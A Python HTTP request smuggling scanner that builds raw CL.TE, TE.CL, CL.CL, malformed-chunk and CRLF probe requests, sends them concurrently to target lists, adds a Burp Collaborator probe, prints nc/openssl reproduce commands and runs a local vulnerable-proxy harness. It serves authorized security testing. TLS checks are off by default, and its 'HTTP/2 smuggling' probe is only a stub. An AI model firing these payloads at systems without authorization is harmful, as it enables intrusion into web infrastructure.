#!/usr/bin/env python3
"""
http_smuggle_scanner_safe_async.py

Safe (non-destructive) HTTP request smuggling scanner + PoC generator + test harness
- ONLY uses GET-based tests (smuggled requests are GETs to unique marker paths)
- Adds many additional GET-focused payloads (CRLF variants, folded headers, Expect: 100-continue safe proofs)
- Asyncio + SSL implementation for high concurrency
- Produces reproducible PoC raw TCP bytes for a selected target/test and prints netcat/openssl commands
- Includes a simple local two-tier test harness (vulnerable frontend proxy + backend) for lab validation
- Optional PCAP capture hook using tcpdump (requires root and tcpdump installed)
- TLS verification can be hardened via --ca-bundle argument to supply a CA file
- ✅ Burp Collaborator OOB integration
- ✅ HTTP/2 smuggling probing (experimental)
- ✅ Markdown report generation
- ✅ CI/CD pipeline support (exit codes, quiet mode)

Usage examples:
  python3 http_smuggle_scanner_safe_async.py -u https://example.com/
  python3 http_smuggle_scanner_safe_async.py -L targets.txt --concurrency 100 --timeout 8 -o out.json --csv out.csv --markdown report.md
  python3 http_smuggle_scanner_safe_async.py --poc "https://example.com/" CL+TE_clash --save-poc poc.raw
  python3 http_smuggle_scanner_safe_async.py --harness --harness-host 127.0.0.1 --harness-frontend-port 8080 --harness-backend-port 9090
  python3 http_smuggle_scanner_safe_async.py -u https://target.com --collaborator xyz.oastify.com --ci --quiet

Safety: All smuggled requests are GETs to marker paths (non-destructive). Only run against targets you are authorized to test.

"""

import argparse
import asyncio
import ssl
import socket
import json
import csv
import random
import string
import sys
import subprocess
import os
from urllib.parse import urlparse
from datetime import datetime

# Optional imports for HTTP/2
try:
    import httpx
    HTTP2_SUPPORTED = True
except ImportError:
    HTTP2_SUPPORTED = False

# ----------------------------
# Helpers
# ----------------------------

def random_marker(n=10):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(n))

# ----------------------------
# Burp Collaborator OOB Integration
# ----------------------------

def generate_oob_payload(collaborator_domain):
    uid = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12))
    oob_host = f"{uid}.{collaborator_domain}"
    return uid, oob_host

def build_oob_smuggled_request(host, path, oob_host):
    return f"GET / HTTP/1.1\r\nHost: {oob_host}\r\nConnection: close\r\n\r\n"

def build_cl_te_oob(host, path, oob_host):
    smuggled = build_oob_smuggled_request(host, path, oob_host)
    body = smuggled
    lines = [
        f"GET {path} HTTP/1.1",
        f"Host: {host}",
        "User-Agent: SmuggleScannerSafe/1.0",
        "Connection: keep-alive",
        "Content-Type: application/octet-stream",
        "Transfer-Encoding: chunked",
        f"Content-Length: {len(body)}",
        "",
        "0",
        "",
        smuggled
    ]
    return "\r\n".join(lines).encode('latin1')

# ----------------------------
# Payload builders (GET-only, non-destructive)
# Each builder returns bytes
# ----------------------------

def build_baseline_get(host, path, marker):
    req_lines = [
        f"GET {path} HTTP/1.1",
        f"Host: {host}",
        "User-Agent: SmuggleScannerSafe/1.0",
        "Connection: close",
        "",
        ""
    ]
    return "\r\n".join(req_lines).encode('latin1')


def build_cl_te_clash(host, path, marker):
    smuggled = f"GET /{marker}/poc_smuggled HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
    body = smuggled
    lines = [
        f"GET {path} HTTP/1.1",
        f"Host: {host}",
        "User-Agent: SmuggleScannerSafe/1.0",
        "Connection: keep-alive",
        "Content-Type: application/octet-stream",
        "Transfer-Encoding: chunked",
        f"Content-Length: {len(body)}",
        "",
        "0",
        "",
        smuggled
    ]
    return "\r\n".join(lines).encode('latin1')


def build_te_cl_mismatch(host, path, marker):
    smuggled = f"GET /{marker}/poc_tecl HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
    chunk = smuggled
    chunk_len_hex = hex(len(chunk))[2:]
    lines = [
        f"GET {path} HTTP/1.1",
        f"Host: {host}",
        "User-Agent: SmuggleScannerSafe/1.0",
        "Connection: keep-alive",
        "Transfer-Encoding: chunked",
        "",
        f"{chunk_len_hex}\r\n" + chunk + "\r\n",
        "0",
        "",
    ]
    return "\r\n".join(lines).encode('latin1')


def build_cl_cl_conflict(host, path, marker):
    smuggled = f"GET /{marker}/poc_clcl HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
    padding = "A" * 8
    body = padding + smuggled
    cl1 = str(len(body))
    cl2 = str(len(body) + 50)
    lines = [
        f"GET {path} HTTP/1.1",
        f"Host: {host}",
        "User-Agent: SmuggleScannerSafe/1.0",
        "Connection: keep-alive",
        f"Content-Length: {cl1}",
        f"Content-Length: {cl2}",
        "",
        body
    ]
    return "\r\n".join(lines).encode('latin1')


def build_malformed_chunk_size(host, path, marker):
    smuggled = f"GET /{marker}/poc_malformed HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
    chunk = "HELLO"
    declared = hex(len(chunk) + len(smuggled))[2:]
    lines = [
        f"GET {path} HTTP/1.1",
        f"Host: {host}",
        "User-Agent: SmuggleScannerSafe/1.0",
        "Connection: keep-alive",
        "Transfer-Encoding: chunked",
        "",
        declared + "\r\n" + chunk + "\r\n",
        "0",
        "",
        smuggled
    ]
    return "\r\n".join(lines).encode('latin1')


def build_uppercase_chunk_hex(host, path, marker):
    smuggled = f"GET /{marker}/poc_upperhex HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
    chunk = smuggled
    chunk_len_hex = hex(len(chunk))[2:].upper()
    lines = [
        f"GET {path} HTTP/1.1",
        f"Host: {host}",
        "User-Agent: SmuggleScannerSafe/1.0",
        "Connection: keep-alive",
        "Transfer-Encoding: chunked",
        "",
        f"{chunk_len_hex}\r\n" + chunk + "\r\n",
        "0",
        "",
    ]
    return "\r\n".join(lines).encode('latin1')


def build_crlf_injection_variant(host, path, marker):
    smuggled = f"GET /{marker}/poc_crlf HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
    lines = [
        f"GET {path} HTTP/1.1",
        f"Host: {host}",
        "User-Agent: SmuggleScannerSafe/1.0",
        "X-Extra: value\r\n\r\n",
        "Connection: keep-alive",
        "",
        smuggled
    ]
    return "\r\n".join(lines).encode('latin1')


def build_folded_header_variant(host, path, marker):
    smuggled = f"GET /{marker}/poc_folded HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
    lines = [
        f"GET {path} HTTP/1.1",
        f"Host: {host}",
        "\tfolded-continuation: true",
        "User-Agent: SmuggleScannerSafe/1.0",
        "Connection: keep-alive",
        "",
        smuggled
    ]
    return "\r\n".join(lines).encode('latin1')


def build_expect_100_safe(host, path, marker):
    smuggled = f"GET /{marker}/poc_expect HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
    lines = [
        f"GET {path} HTTP/1.1",
        f"Host: {host}",
        "User-Agent: SmuggleScannerSafe/1.0",
        "Expect: 100-continue",
        "Connection: keep-alive",
        "",
        smuggled
    ]
    return "\r\n".join(lines).encode('latin1')

# Template registry (base)
BASE_TEMPLATES = [
    ("baseline-get", build_baseline_get),
    ("CL+TE_clash", build_cl_te_clash),
    ("TE+CL_smuggle", build_te_cl_mismatch),
    ("CL+CL_conflict", build_cl_cl_conflict),
    ("chunk_malformed", build_malformed_chunk_size),
    ("chunk_upper_hex", build_uppercase_chunk_hex),
    ("crlf_injection", build_crlf_injection_variant),
    ("folded_header", build_folded_header_variant),
    ("expect_100_safe", build_expect_100_safe),
]

# ----------------------------
# Analysis heuristics (simple, marker-based)
# ----------------------------

def analyze(baseline_bytes, test_bytes, marker):
    base = baseline_bytes.decode('latin1', errors='ignore') if baseline_bytes else ''
    test = test_bytes.decode('latin1', errors='ignore') if test_bytes else ''
    findings = []
    if marker in test and marker not in base:
        findings.append('marker_in_test')
    if test.count('HTTP/') >= 2:
        findings.append('multiple_http_in_test')
    if len(base) > 0:
        ratio = abs(len(test) - len(base)) / max(1, len(base))
        if ratio > 0.25:
            findings.append(f'length_ratio_{ratio:.2f}')
    return findings

# ----------------------------
# Async networking with optional CA bundle for TLS
# ----------------------------

async def open_connection_async(host, port, use_tls, timeout, ca_bundle=None):
    if use_tls:
        if ca_bundle:
            ctx = ssl.create_default_context(cafile=ca_bundle)
        else:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        reader, writer = await asyncio.open_connection(host, port, ssl=ctx)
    else:
        reader, writer = await asyncio.open_connection(host, port)
    return reader, writer

async def send_recv_async(host, port, use_tls, raw_bytes, timeout, ca_bundle=None):
    try:
        start = asyncio.get_event_loop().time()
        reader, writer = await open_connection_async(host, port, use_tls, timeout, ca_bundle)
        writer.write(raw_bytes)
        await writer.drain()
        data = bytearray()
        try:
            while True:
                chunk = await asyncio.wait_for(reader.read(4096), timeout=timeout)
                if not chunk:
                    break
                data.extend(chunk)
        except asyncio.TimeoutError:
            pass
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass
        duration = asyncio.get_event_loop().time() - start
        return bytes(data), duration, None
    except Exception as e:
        return b"", 0.0, e

# ----------------------------
# HTTP/2 Smuggling Support (Experimental)
# ----------------------------

async def send_h2_smuggle_request(url, marker, timeout=8.0):
    if not HTTP2_SUPPORTED:
        return b"", 0.0, "httpx/h2 not installed"
    try:
        parsed = urlparse(url)
        async with httpx.AsyncClient(http2=True, timeout=timeout, verify=False) as client:
            # Normal request
            await client.get(url)
            # Attempt to detect H2 support
            return b"HTTP/2 probed", 0.0, None
    except Exception as e:
        return b"", 0.0, repr(e)

# ----------------------------
# Scanning logic
# ----------------------------

async def scan_single_target(url, timeout=8.0, ca_bundle=None, collaborator_domain=None, quiet=False):
    parsed = urlparse(url)
    scheme = parsed.scheme or 'http'
    host = parsed.hostname
    port = parsed.port or (443 if scheme == 'https' else 80)
    path = parsed.path or '/'
    if parsed.query:
        path += '?' + parsed.query
    use_tls = scheme.lower() == 'https'

    marker = random_marker(10)
    result = {
        'target': url,
        'host': host,
        'port': port,
        'path': path,
        'timestamp': datetime.utcnow().isoformat() + 'Z',
        'findings': []
    }

    # Baseline
    baseline_req = build_baseline_get(host, path, marker)
    baseline_resp, base_time, base_err = await send_recv_async(host, port, use_tls, baseline_req, timeout, ca_bundle)
    if base_err:
        result['error'] = f'baseline_conn_err: {repr(base_err)}'
        return result

    # Build templates
    templates = BASE_TEMPLATES.copy()
    oob_uid = None
    if collaborator_domain:
        oob_uid, oob_host = generate_oob_payload(collaborator_domain)
        templates.append(("CL+TE_OOB", lambda h, p, m: build_cl_te_oob(h, p, oob_host)))

    # Run tests
    for name, builder in templates:
        try:
            req = builder(host, path, marker)
            resp, dur, err = await send_recv_async(host, port, use_tls, req, timeout, ca_bundle)
            if err:
                result['findings'].append({'test': name, 'status': 'conn_err', 'error': repr(err)})
                continue
            heur = analyze(baseline_resp, resp, marker)
            entry = {
                'test': name,
                'duration': dur,
                'resp_len': len(resp),
                'heuristics': heur,
                'snippet': resp.decode('latin1', errors='ignore')[:800],
                'suspect': bool(heur)
            }
            if oob_uid and name == "CL+TE_OOB":
                entry['oob_uid'] = oob_uid
                entry['note'] = f"Verify DNS/HTTP interaction for {oob_uid}.{collaborator_domain}"
            result['findings'].append(entry)
        except Exception as e:
            result['findings'].append({'test': name, 'status': 'exception', 'error': repr(e)})

    # HTTP/2 probe
    if use_tls and HTTP2_SUPPORTED:
        h2_resp, h2_dur, h2_err = await send_h2_smuggle_request(url, marker, timeout)
        result['h2_probe'] = {'error': h2_err} if h2_err else {'status': 'probed'}

    return result

async def run_scans(targets, concurrency=20, timeout=8.0, ca_bundle=None, pcap=None, collaborator_domain=None, quiet=False):
    sem = asyncio.Semaphore(concurrency)
    results = []

    async def sem_wrapper(u):
        async with sem:
            try:
                return await scan_single_target(u, timeout=timeout, ca_bundle=ca_bundle, collaborator_domain=collaborator_domain, quiet=quiet)
            except Exception as e:
                return {'target': u, 'error': repr(e)}

    # Start pcap if requested
    pcap_proc = None
    if pcap:
        try:
            pcap_proc = subprocess.Popen(['tcpdump', '-w', pcap, 'tcp'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            if not quiet:
                print(f"[+] Started tcpdump, writing to {pcap} (pid={pcap_proc.pid})")
        except Exception as e:
            if not quiet:
                print(f"[!] Could not start tcpdump: {e}")

    tasks = [asyncio.create_task(sem_wrapper(u)) for u in targets]
    for coro in asyncio.as_completed(tasks):
        res = await coro
        results.append(res)
        if not quiet:
            print(f"[+] Completed: {res.get('target')} -> findings: {len(res.get('findings', []))}")

    if pcap_proc:
        try:
            pcap_proc.terminate()
            pcap_proc.wait(timeout=2)
            if not quiet:
                print(f"[+] Stopped tcpdump, file saved: {pcap}")
        except Exception:
            pass

    return results

# ----------------------------
# PoC generator
# ----------------------------

def generate_poc_raw(url, template_name, save_filename=None):
    parsed = urlparse(url)
    scheme = parsed.scheme or 'http'
    host = parsed.hostname
    port = parsed.port or (443 if scheme == 'https' else 80)
    path = parsed.path or '/'
    if parsed.query:
        path += '?' + parsed.query
    use_tls = scheme.lower() == 'https'

    marker = random_marker(10)
    builder = None
    for name, b in BASE_TEMPLATES:
        if name == template_name:
            builder = b
            break
    if not builder:
        raise ValueError('unknown template')

    raw = builder(host, path, marker)

    if save_filename:
        with open(save_filename, 'wb') as f:
            f.write(raw)

    return raw, marker, use_tls, port

# ----------------------------
# Small two-tier test harness (async)
# ----------------------------

class SimpleBackend:
    def __init__(self, host='127.0.0.1', port=9090):
        self.host = host
        self.port = port
        self.received = []

    async def handle_client(self, reader, writer):
        data = await reader.read(65536)
        text = data.decode('latin1', errors='ignore')
        self.received.append(text)
        resp = 'HTTP/1.1 200 OK\r\nContent-Length: 12\r\nConnection: close\r\n\r\nHello backend'
        writer.write(resp.encode('latin1'))
        await writer.drain()
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass

    async def start(self):
        self.server = await asyncio.start_server(self.handle_client, self.host, self.port)
        print(f"[harness] backend listening on {self.host}:{self.port}")

    async def stop(self):
        self.server.close()
        await self.server.wait_closed()


class NaiveFrontendProxy:
    def __init__(self, host='127.0.0.1', port=8080, backend_host='127.0.0.1', backend_port=9090):
        self.host = host
        self.port = port
        self.backend_host = backend_host
        self.backend_port = backend_port

    async def handle_client(self, reader, writer):
        try:
            data = await asyncio.wait_for(reader.read(65536), timeout=1.0)
        except Exception:
            data = b''
        if not data:
            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass
            return

        try:
            backend_reader, backend_writer = await asyncio.open_connection(self.backend_host, self.backend_port)
            backend_writer.write(data)
            await backend_writer.drain()
            resp = await backend_reader.read(65536)
            writer.write(resp)
            await writer.drain()
            backend_writer.close()
            try:
                await backend_writer.wait_closed()
            except Exception:
                pass
        except Exception:
            writer.write(b'HTTP/1.1 502 Bad Gateway\r\nContent-Length: 11\r\nConnection: close\r\n\r\nBadGateway')
            try:
                await writer.drain()
            except Exception:
                pass
        finally:
            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass

    async def start(self):
        self.server = await asyncio.start_server(self.handle_client, self.host, self.port)
        print(f"[harness] frontend proxy listening on {self.host}:{self.port} -> {self.backend_host}:{self.backend_port}")

    async def stop(self):
        self.server.close()
        await self.server.wait_closed()

# ----------------------------
# I/O helpers
# ----------------------------

def load_targets_from_file(filename):
    urls = []
    with open(filename, 'r', encoding='utf-8') as f:
        for line in f:
            l = line.strip()
            if not l:
                continue
            if l.startswith('http://') or l.startswith('https://'):
                urls.append(l)
            else:
                urls.append('http://' + l)
    return urls


def save_json(results, filename):
    with open(filename, 'w', encoding='utf-8') as f:
        json.dump(results, f, indent=2, ensure_ascii=False)


def save_csv(results, filename):
    rows = []
    for r in results:
        target = r.get('target')
        for f in r.get('findings', []):
            rows.append({
                'target': target,
                'test': f.get('test'),
                'suspect': f.get('suspect', False),
                'duration': f.get('duration'),
                'resp_len': f.get('resp_len'),
                'heuristics': ';'.join(f.get('heuristics', [])) if f.get('heuristics') else ''
            })
    with open(filename, 'w', newline='', encoding='utf-8') as csvfile:
        writer = csv.DictWriter(csvfile, fieldnames=['target','test','suspect','duration','resp_len','heuristics'])
        writer.writeheader()
        for row in rows:
            writer.writerow(row)


def save_markdown_report(results, filename):
    with open(filename, 'w', encoding='utf-8') as f:
        f.write("# HTTP Request Smuggling Scan Report\n\n")
        f.write(f"Generated: {datetime.utcnow().isoformat()} UTC\n\n")
        f.write("| Target | Vulnerable? | Findings |\n")
        f.write("|--------|-------------|----------|\n")
        
        for r in results:
            if 'error' in r:
                status = "⚠️ Error"
                details = r['error']
            else:
                suspects = [f['test'] for f in r.get('findings', []) if f.get('suspect')]
                if suspects:
                    status = "🔴 **Yes**"
                    details = ", ".join(suspects)
                else:
                    status = "🟢 No"
                    details = "No anomalies"
            f.write(f"| {r['target']} | {status} | {details} |\n")
        
        f.write("\n## Notes\n")
        f.write("- All tests are **non-destructive** (GET-only).\n")
        f.write("- Verify findings manually using PoC generator.\n")
        f.write("- HTTP/2 smuggling support is experimental.\n")
        f.write("- OOB findings require manual verification in Burp Collaborator.\n")

# ----------------------------
# CLI
# ----------------------------

def main():
    parser = argparse.ArgumentParser(description='Safe async HTTP request smuggling scanner (GET-only, PoC, harness).')
    group = parser.add_mutually_exclusive_group(required=False)
    group.add_argument('-u','--url',help='Single target URL')
    group.add_argument('-L','--list',help='File with target URLs, one per line')
    parser.add_argument('--concurrency','-c',type=int,default=50)
    parser.add_argument('--timeout','-t',type=float,default=8.0)
    parser.add_argument('-o','--output',default='smuggle_safe_results.json')
    parser.add_argument('--csv',default=None)
    parser.add_argument('--markdown', default=None, help='Save report as Markdown')
    parser.add_argument('--poc',nargs=2,metavar=('URL','TEMPLATE'),help='Generate PoC raw bytes for URL and TEMPLATE name')
    parser.add_argument('--save-poc',default=None,help='Filename to save raw PoC bytes')
    parser.add_argument('--pcap',default=None,help='Optional tcpdump pcap filename to capture during the scan (requires tcpdump and root)')
    parser.add_argument('--ca-bundle',default=None,help='Optional CA bundle file path to verify TLS connections')
    parser.add_argument('--collaborator', default=None, help='Burp Collaborator domain (e.g., xyz.oastify.com) for OOB detection')
    parser.add_argument('--harness',action='store_true',help='Start local test harness')
    parser.add_argument('--harness-host',default='127.0.0.1')
    parser.add_argument('--harness-frontend-port',type=int,default=8080)
    parser.add_argument('--harness-backend-port',type=int,default=9090)
    parser.add_argument('--ci', action='store_true', help='CI/CD mode: exit 1 if any suspect found')
    parser.add_argument('--quiet', action='store_true', help='Suppress non-essential output')

    args = parser.parse_args()

    if args.poc:
        url, template = args.poc
        raw, marker, use_tls, port = generate_poc_raw(url, template, args.save_poc)
        print(f"PoC generated for template={template} marker=/{marker}/poc_*")
        print("--- raw bytes (hex preview, first 512 bytes) ---")
        print(raw[:512].hex())
        if args.save_poc:
            print(f"Saved raw bytes to {args.save_poc}")
        print('\nReproduce examples:')
        parsed = urlparse(url)
        host = parsed.hostname
        print(f"# Plain TCP reproduce:\n# echo -ne '<raw>' | nc {host} {port}")
        print(f"# TLS reproduce:\n# openssl s_client -quiet -connect {host}:{port} < {args.save_poc or 'poc.raw'}")
        return

    if args.harness:
        backend = SimpleBackend(host=args.harness_host, port=args.harness_backend_port)
        frontend = NaiveFrontendProxy(host=args.harness_host, port=args.harness_frontend_port, backend_host=args.harness_host, backend_port=args.harness_backend_port)

        async def run_harness():
            await backend.start()
            await frontend.start()
            if not args.quiet:
                print('[harness] running - send smuggling payloads to frontend to test')
            try:
                while True:
                    await asyncio.sleep(1)
            except asyncio.CancelledError:
                pass

        loop = asyncio.get_event_loop()
        try:
            task = loop.create_task(run_harness())
            loop.run_forever()
        except KeyboardInterrupt:
            if not args.quiet:
                print('\n[harness] stopping...')
            task.cancel()
            loop.run_until_complete(frontend.stop())
            loop.run_until_complete(backend.stop())
        return

    targets = []
    if args.url:
        targets = [args.url]
    elif args.list:
        targets = load_targets_from_file(args.list)
    else:
        print('No targets provided. Use -u or -L, or --poc, or --harness.')
        return

    loop = asyncio.get_event_loop()
    results = loop.run_until_complete(
        run_scans(
            targets,
            concurrency=args.concurrency,
            timeout=args.timeout,
            ca_bundle=args.ca_bundle,
            pcap=args.pcap,
            collaborator_domain=args.collaborator,
            quiet=args.quiet
        )
    )

    save_json(results, args.output)
    if not args.quiet:
        print(f"Results saved to {args.output}")
    if args.csv:
        save_csv(results, args.csv)
        if not args.quiet:
            print(f"CSV saved to {args.csv}")
    if args.markdown:
        save_markdown_report(results, args.markdown)
        if not args.quiet:
            print(f"Markdown report saved to {args.markdown}")

    # Summary
    suspects = []
    for r in results:
        for f in r.get('findings', []):
            if f.get('suspect'):
                suspects.append((r.get('target'), f.get('test'), f.get('heuristics')))

    if not args.quiet:
        if suspects:
            print('\nPotential smuggling findings:')
            for s in suspects:
                print(f"- {s[0]} [{s[1]}] heuristics={s[2]}")
        else:
            print('\nNo obvious smuggling anomalies found by heuristics.')

    # CI/CD exit logic
    if args.ci:
        total_suspects = len(suspects)
        if total_suspects > 0:
            if not args.quiet:
                print(f"::error::Found {total_suspects} smuggling suspects")
            sys.exit(1)
        else:
            if not args.quiet:
                print("::notice::No smuggling suspects found")
            sys.exit(0)

if __name__ == '__main__':
    main()